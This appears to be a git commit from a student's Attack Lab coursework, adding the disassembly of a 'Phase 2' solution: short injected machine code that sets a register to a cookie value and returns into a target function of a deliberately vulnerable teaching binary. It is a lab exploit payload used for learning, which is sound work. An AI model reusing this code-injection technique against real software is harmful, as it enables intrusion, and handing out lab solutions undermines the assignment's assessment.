16155cd0ee81f6107e016b83ca551a6ea8df0397
Nurseiit Abdimomyn <nurs@unist.ac.kr>
2019-04-07 18:59:18 +0900

    Solve `Phase 2`

---
+++ attacklab/target39/helpers/phase2.asm
@@ -0,0 +1,10 @@
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 9a d9 e2 68 	mov    $0x68e2d99a,%rdi
+   7:	68 51 19 40 00       	pushq  $0x401951
+   c:	c3                   	retq   
